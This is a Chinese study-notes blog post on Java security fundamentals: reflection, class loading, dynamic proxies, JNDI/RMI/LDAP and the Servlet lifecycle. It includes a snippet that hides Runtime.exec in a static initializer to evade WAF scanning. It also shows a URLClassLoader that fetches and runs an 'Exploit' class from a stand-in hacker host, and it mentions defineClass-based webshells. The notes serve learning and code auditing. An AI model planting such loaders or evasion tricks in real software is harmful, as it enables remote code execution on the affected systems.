+++
date = '2026-02-16'
draft = false
title = 'Java基础'
categories = ["java"]

+++

### JAVA 反射

##### 什么是java的反射

java反射就是在程序运行状态中，能够知道任何一个类的所有属性和方法，并且能够调用这些属性和方法的功能

##### 正向 VS 反向

**正向流程：** 导入类 --> `new`对象 --> 调用对象

```
User user = new User(); user.login();
```

如果类不存在就报错

**反向流程：**拿到字符串类名 --> 让JVM去找这个类 --> 强行拆解这个类 -->  调用里面的东西

```
Class.forName("com.User").getMethod("login").invoke(obj);
```

动态加载类，即使编译时类还没有也能运行



### 类加载机制

##### 什么是类加载

java代码进行编译后就是`.class`文件（字节码），类加载就是把这些二进制数据读进内存，解析并生成一个`java.lang.Class`对象的过程

##### 类加载的三个阶段

```
Loading（加载） 读取字节流，不执行代码
Linking（链接） 分为验证，准备，解析。 一般不执行代码
lnitialization(初始化) 执行静态代码块，静态变量的赋值动作
```



###### 两种攻击方式：

```java
例子：
class Evil {
    // 1. 静态变量赋值
    public static int a = runCommand(); 

    // 2. 静态代码块
    static {
        System.out.println("静态代码块被执行了");
    }

    public static int runCommand() {
        System.out.println("静态变量赋值触发了恶意方法！");
        return 1;
    }
}
```

会会先执行赋值，然后是静态代码块。因为初始化执行的顺序是 “静态变量赋值” 和 “静态代码块”

**绕WAF：** WAF或者代码扫描工具会盯着`static ()`这种特征。可以使用将恶意逻辑隐藏在静态变量赋值中：

```java
public class SneakyEvil {
    // 看起来只是一个普通的变量定义
    // 但实际上，getRuntime() 会在类初始化时立即执行
    public static Process p = Runtime.getRuntime().exec("calc.exe");
    
    // 没有 static {} 代码块，扫描工具可能漏报
}
```

只要初始化就会执行，不需要实例化

审计判断：

判断 `Class.forName("TargetClass")` 是否危险时，要检查 `TargetClass` 里：

1. 有没有 `static { ... }` 且里面有危险代码？
2. 有没有 `static Type var = dangerousMethod();` 这种赋值操作？

#### 双亲委派模型

为了保证恶意类不会被加载

```
Bootstrap ClassLoader（启动类 加载器）： 负责加载JDK核心库
Extension ClassLoader (扩展类 加载器) ： 负责加载JDK扩展目录（jre/lib/ext）下的包
App/System ClassLoader（应用类 加载器）； 负责加载写的代码
```

##### 那怎么进行绕过呢

有以下几个方法

1. `URLClassLoader`

   java允许远程加载类

   ```java
   // 攻击者可控的 URL
   URL url = new URL("http://hacker-site.com/malicious.jar"); 
   URLClassLoader loader = new URLClassLoader(new URL[]{url});
   Class<?> evil = loader.loadClass("Exploit"); // 远程加载木马
   evil.newInstance(); // 执行
   ```

   

2. `defineClass`

   ClassLoader 中最底层的方法（`protected`）。它接受一个 **`byte[]` 数组**，直接把它变成 Class 对象。

   像冰蝎，哥斯拉等webshell工具，通过HTTP POST发送一段加密的字节码，服务端被植入的webshell会调用`defineClass`将字节码转换成内存中的类运行

   

3. 线程上下文类加载器

   有些框架（如 Tomcat, Spring）为了实现热部署，破坏了双亲委派模型（自己优先加载，找不到再给父类）。

   这种机制有时会导致“类加载隔离失效”，或者被利用来加载 WEB-INF 下的敏感类

   

### 动态代理

###### 什么是代理：

为其他对象提供一种代理以便控制对这个对象的访问（所谓控制，就是可以在其调用行为前后分别加入一些操作）

###### 代理模式分类：

1. 静态代理，实质是类的继承或接口的实现
2. **动态代理**（jdk动态代理），发生反序列化漏洞的地方
3. cglib动态代理

注：简单讲解一下静态代理，如某个程序员读源码发现某个地方可以增强, 比如某个函数执行前或执行后应该做一些操作，直接修改原有代码容易出错。 做法就是自己实现一个类，和原始类相同，通过在方法中引用老程序的方法来实现自己的方法，从而实现在不改动源代码的基础上达到增强方法的目的	

#### 动态代理

静态代理模式有个问题，当类方法数量越来越多，代理类的代码量是十分庞大的

所以引入动态代理解决这个问题，动态代理的动态在于，他不是在代码中写死的，而是**通过反射机制**动态生成的

###### JDK动态代理的两个核心类

1. `java.lang.reflect.Proxy` 生成代理对象
2. `java.lang.reflect.InvocationHandler`所有对代理对象的方法调用，都会被转发到`invoke`方法



##### 如何审计

**查找 `InvocationHandler` 的实现类：**

- 看看哪些类实现了这个接口。
- **重点看 `invoke` 方法体：** 里面有没有危险操作？有没有把 `method.invoke` 的参数放得太宽？

**查找 `Proxy.newProxyInstance`：**

- 生成的代理对象流向了哪里？
- 如果它被转换成了某个接口，并传入了敏感流程（如权限校验、文件操作），攻击者可能通过代理绕过校验。

**反序列化入口 (readObject)：**

- 如果在 `readObject` 中对某个字段调用了方法，而这个字段是可以被反序列化控制的，那么攻击者可以传入一个动态代理，把这个方法调用“重定向”到任意位置。



### JNDI和RMI/LDAP

#### RMI （远程方法调用）

是 Java 的一种 RPC（远程过程调用）机制。 简单来说，它允许**A 机器上的 Java 程序，去调用 B 机器上的对象方法**，就像调用本地方法一样简单。

- **本地调用：** `User user = new User(); user.sayHello();`
- **RMI 调用：** `User user = (User) registry.lookup("User"); user.sayHello();`

###### 工作的三个角色：

**Stub (存根)：** 客户端的代理对象（类似动态代理）。它负责把请求打包（序列化）并发给服务端。

**Skeleton (骨架)：** 服务端的监听器。它负责接收数据包，解包（反序列化），调用真正的服务端代码，再把结果返回给客户端。

**Registry (注册中心)：** 像一个电话本。服务端把对象**绑定 (bind)** 到一个名字上，客户端去**查找 (lookup)** 这个名字。



#### LDAP（轻量级目录访问协议）

一个通用的**目录服务**协议

因为 Java 的 JNDI 接口支持 LDAP 协议，而且 LDAP 允许在条目中存储 **Java 对象数据**

##### LDAP注入

LDAP除了能返回数据，还可以返回：

1. 序列化对象： 返回base64后的二进制，客户端你拿到后自动反序列化
2. JNDI引用： 返回URL。 这也是Log4j漏洞的根源



#### JNDI (java命名和目录接口)

Java 搞的一套**统一接口**。它的初衷是让你可以用统一的方式去查找资源（对象、配置、数据库连接）。

但是方便就意味着不安全著名的 `JNDI`注入就出现在此. 

JNDI 支持一种引用机制，当查找对象时候对象在本地找不到就会去远程下载



#### JDK 不同版本

**JDK < 8u121：**RMI 和 LDAP 都允许加载远程代码，直接 RCE。

**JDK 8u121 ~ 8u191：**

- `com.sun.jndi.rmi.object.trustURLCodebase` 默认为 `false`。

  虽然 rmi不能使用，但是还有 LDAP

**JDK > 8u191：**

- `com.sun.jndi.ldap.object.trustURLCodebase` 也默认为 `false`LDAP也不能使用。

  但是这并不意味着安全，还有很多绕过的方法，水平有限不过多讲解



### JAVA WEB 应用

Java Web 应用是基于 Java 技术开发，运行在 Web 服务器或 Servlet 容器上的动态网站或在线服务。

###### 由三个部分组成：

静态资源： ....

动态组件: **Servlet、Filter、Interceptor、Listener**。它们负责处理逻辑、拦截请求、保护安全。

配置文件: 老项目：`web.xml`  新项目（spring boot）： `application.yml` 或纯 Java 代码配置

###### 运行环境

Java Web 程序不能像普通的 `.exe` 一样双击运行，它需要一个**“容器”**（也叫 Web 中间件）。

**常见的容器**：Tomcat、Jetty、JBoss、WebLogic。

**容器的作用**：

1. 监听网络端口（如 8080）
2. 接收 HTTP 请求
3. 把请求翻译成 Java 对象（`HttpServletRequest`）
4. 交给你的代码（Servlet/Filter）去处理

#### listener

1. **监听启动**

- 当 Web 应用启动时，Servlet 容器会调用此方法。

- 你可以在这里编写初始化代码，比如加载配置文件、初始化数据库连接池、启动后台任务等。

- 这是 Web 应用的“入口”钩子方法。

方法

```java
public void contextInitialized(ServletContextEvent sce)
```

参数 `ServletContextEvent sce `提供对 `ServletContext `（应用上下文）的访问。

```java
public void contextInitialized(ServletContextEvent sce) {
	System.out.println("AppListener.contextInitialized");
}
```

2. **监听关闭**

- 当 Web 应用关闭或被卸载时，Servlet 容器会调用此方法。
- 你可以在这里释放资源，比如关闭数据库连接池、停止后台线程、清理缓存等。
- 是 Web 应用关闭时的清理钩子。

方法

```java
public void contextDestroyed(ServletContextEvent sce)
```

参数 `ServletContextEvent sce` 提供对 `ServletContext` 的访问。

```java
public void contextDestroyed(ServletContextEvent sce) {
	System.out.println("AppListener.contextDestroyed");
}
```



#### FIlter

Filter 是 Java Servlet 规范中的一个接口，允许你在请求到达 Servlet 之前或响应发送给客户端之前，进行拦截和

处理。

过滤器通常用于实现统一日志记录、权限校验、编码设置、请求修改、响应压缩等功能。

过滤器可以链式调用，一个请求可以经过多个过滤器。

**1.初始化时调用的方法**

**作用**

- `init(FilterConfig config) `是 Filter 初始化时调用的方法。
- 容器创建 Filter 实例后，会调用此方法来完成初始化工作。
- 你可以在这里读取配置参数、初始化资源或做其他准备。

**方法**

```java
public void init(FilterConfig config) throws ServletException
```

- 参数 FilterConfig config 是过滤器配置对象，提供了访问过滤器初始化参数和 ServletContext 的方法。
- ServletException 是初始化失败时可以抛出的异常。

```java
@Override
public void init(FilterConfig filterConfig) throws ServletException {
	System.out.println("XssFilter.init");
}
```

**2.核心过滤方法，处理请求和响应，决定是否放行请求**

**作用**

- `doFilter() `是过滤器中最重要的方法，每当请求匹配到该过滤器时，都会调用它。
- 它负责对请求进行预处理、调用链中下一个过滤器或目标资源（Servlet、JSP等），然后对响应进行后处理。
- 可以控制请求是否继续传递，或者直接拦截请求并返回响应。

**方法**

```java
public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException
```

- ServletRequest req ：封装客户端请求信息。
- ServletResponse resp ：用于发送响应数据。
- FilterChain chain ：过滤器链对象，负责将请求传递给下一个过滤器或目标资源。

```
@WebFilter("/*") 
public class EncodingFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        
        // 1. 预处理：设置请求和响应编码为 UTF-8
        // 注意：原代码中的单个斜杠 "/" 是错误的，Java 注释需使用 "//"
        request.setCharacterEncoding("UTF-8");
        response.setCharacterEncoding("UTF-8");
        System.out.println("EncodingFilter: 请求进入，设置编码");

        // 2. 放行请求
        // 调用 chain.doFilter 将请求传递给过滤链的下一个组件（下一个 Filter 或 Servlet）
        chain.doFilter(request, response);

        // 3. 后处理逻辑
        // 在目标 Servlet 处理完业务并准备返回响应时执行
        System.out.println("EncodingFilter: 响应返回，后处理完成");
    }

    // 注意：根据接口规范，虽然 Java 8 后不强制，但建议保留 init 和 destroy 方法的空实现
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    @Override
    public void destroy() {}
}
```

**3.销毁**

作⽤

- destroy() 是容器在卸载 Servlet 或 Filter 实例之前调用的方法。
- 用来释放资源、关闭连接、停止线程等，做清理工作。
- 只会被调用一次。

⽅法

```java
public void destroy()
```

无参数，无返回值。

不允许抛出异常。

```java
@Override
public void destroy() {
//关闭数据库连接

	if (dbConnection != null) {
		try {
			dbConnection.close();
	  } catch (SQLException e) {
			e.printStackTrace();
	  }
   }
	System.out.println("资源已释放，Servlet/Filter 销毁");
}
```



#### Servlet 容器

1. **容器启动阶段**

- 当你启动 Tomcat 或部署一个 Web 应用时，容器会：

  - 扫描 web.xml 配置文件或注解（ @WebListener , @WebFilter , @WebServlet ）；

  - 自动创建 Listener、Filter、Servlet 实例；

  - 依次调用 Listener 的 contextInitialized() 、Filter 的 init() 和 Servlet 的 init() 方法。

2. **请求处理阶段**

- 当有 HTTP 请求到达时，容器会：

  - 根据请求 URL 匹配 Filter 链，自动依次调用每个 Filter 的 doFilter() 方法；

  - 放行后，调用对应 Servlet 的 service() （或 doGet() / doPost() ）方法；

  - 响应生成后，Filter 继续进行响应的后处理。

3. **应用关闭阶段**

- 当你停止 Tomcat 或卸载 Web 应用时，容器会：

  - 自动调用 Servlet 的 destroy() ；

  - 调用 Filter 的 destroy() ；

  - 调用 Listener 的 contextDestroyed() 。



##### 1. Servlet 初始化

**作用**

- `init(ServletConfig config)` 是 Servlet 初始化方法，容器在创建 Servlet 实例后会调用它。
-  主要用来完成 Servlet 的初始化工作，比如读取配置参数、准备资源等。
-  它只会被调用一次。

**方法**

```java
public void init(ServletConfig config) throws ServletException
```

- 参数 `ServletConfig config` 是容器传递给 Servlet 的配置对象，包含该 Servlet 的配置信息（如初始化参数、Servlet 名称、ServletContext 等）。
- `ServletException` 是初始化失败时抛出的异常。

```java
public void init(ServletConfig config) throws ServletException {
    System.out.println("HelloServlet.init");
}
```

##### 2. Servlet 处理客户端请求的核心入口

**作用**

- `service()` 方法是 Servlet 处理客户端请求的核心入口。 
- 容器每接收到一次请求，都会调用 Servlet 的 `service()` 方法，将请求和响应对象传入。
-  该方法负责根据请求类型（GET、POST、PUT、DELETE等）分发调用相应的 `doGet()`, `doPost()` 等具体处理方法。

**方法**

```java
public void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException
```

- `HttpServletRequest req` ：封装了客户端请求的所有信息，如参数、头信息、请求方法等。
-  `HttpServletResponse resp` ：用于向客户端发送响应数据，如响应头、内容等。 
- 抛出 `ServletException` 和 `IOException` ，表示处理请求时可能出现的异常。

```java
protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    System.out.println("HelloServlet.service");
}
```

##### 3. 客户端通过 HTTP GET 方式发送的请求

**作用**

- `doGet()` 是专门用于处理客户端通过 HTTP GET 方式发送的请求。
-  浏览器访问一个网址、点击超链接、或者表单使用 GET 方法提交时，服务器调用这个方法。
-  该方法负责读取请求参数、执行业务逻辑并生成响应内容。

**方法**

```java
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException
```

- `HttpServletRequest req` ：封装请求的所有数据，包括参数、头信息、请求路径等。
-  `HttpServletResponse resp` ：用于构建和发送响应，如设置响应头、写出响应体。
-  抛出 `ServletException` 和 `IOException` ，表明请求处理时可能产生的异常。

```java
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    // 设置响应内容类型和编码
    resp.setContentType("text/html;charset=UTF-8");
    // 获取请求参数
    String name = req.getParameter("name");
    if (name == null) {
        name = "访客";
    }
    // 获取响应输出流
    PrintWriter out = resp.getWriter();
    // 输出HTML内容
    out.println("<html><body>");
    out.println("<h1>欢迎，" + name + "！</h1>");
    out.println("</body></html>");
}
```

**工作流程**

1. 容器收到 GET 请求后，调用 Servlet 的 `service()` 方法。
2. `service()` 判断请求方法为 GET，调用 `doGet()` 。
3. 开发者重写 `doGet()` ，实现业务逻辑，向响应流写内容。
4. 容器将响应发送回客户端。

##### 4. 客户端通过 HTTP POST 方法发送的请求

**作用**

- `doPost()` 用来处理客户端通过 HTTP POST 方法发送的请求。
-  POST 请求通常用于提交表单数据、上传文件、发送较大或敏感的数据。
-  Servlet 接收到 POST 请求时，会调用此方法进行处理。

**方法**

```java
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException
```

- 参数 `req` 封装了请求中的数据（请求体、参数、请求头等）。 
- 参数 `resp` 用于构建 and 发送响应（设置响应头、状态码、写响应体）。
-  抛出异常表示处理过程中可能出现的错误。

```java
@Override
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    // 设置请求编码，防止中文乱码
    req.setCharacterEncoding("UTF-8");
    // 设置响应内容类型和编码
    resp.setContentType("text/html;charset=UTF-8");
    // 从请求体中获取参数
    String username = req.getParameter("username");
    String password = req.getParameter("password");
    // 模拟业务处理
    PrintWriter out = resp.getWriter();
    out.println("<html><body>");
    if ("admin".equals(username) && "123456".equals(password)) {
        out.println("<h1>登录成功，欢迎 " + username + "!</h1>");
    } else {
        out.println("<h1>登录失败，用户名或密码错误！</h1>");
    }
    out.println("</body></html>");
}
```

**工作流程**

1. 客户端通过 POST 方法发送请求，通常提交表单数据。
2. 容器调用 Servlet 的 `service()` 方法。
3. `service()` 方法检测到请求是 POST，调用 `doPost()` 。
4. 开发者在 `doPost()` 中处理请求参数，执行业务逻辑，生成响应。

##### 5. Servlet 被销毁

**作用**

- `destroy()` 方法用于 Servlet 被销毁时执行清理操作。 
- 容器在卸载 Servlet 或关闭应用服务器时调用此方法。 
- 开发者在这里释放占用的资源，如关闭数据库连接、清理缓存、停止线程等。

**方法**

```java
public void destroy()
```

- 无参数，无返回值。
-  不允许抛出异常。

```java
@Override
public void destroy() {
    System.out.println("HelloServlet.destroy");
}
```



#### 总结

1. 作用

| **组件**     | **作用**                      | **生命周期管理者** |
| ------------ | ----------------------------- | ------------------ |
| **Tomcat**   | Java Web 容器，运行环境       | 操作系统/自身      |
| **Servlet**  | 核心业务处理单元              | Tomcat             |
| **Filter**   | 请求/响应拦截、预处理和后处理 | Tomcat             |
| **Listener** | 生命周期事件监听和资源管理    | Tomcat             |

2. 流程

```
Web应用启动
↓
Listener初始化（contextInitialized）
↓
Filter初始化（init）
↓
Servlet实例化及初始化（init）
↓
请求到来
↓
Filter执行请求预处理（doFilter）
↓
Servlet执行业务处理（service/doGet/doPost）
↓
响应返回，Filter响应后处理
↓
Web应用关闭
↓
Servlet销毁（destroy）
↓
Filter销毁（destroy）
↓
Listener销毁（contextDestroyed）
```

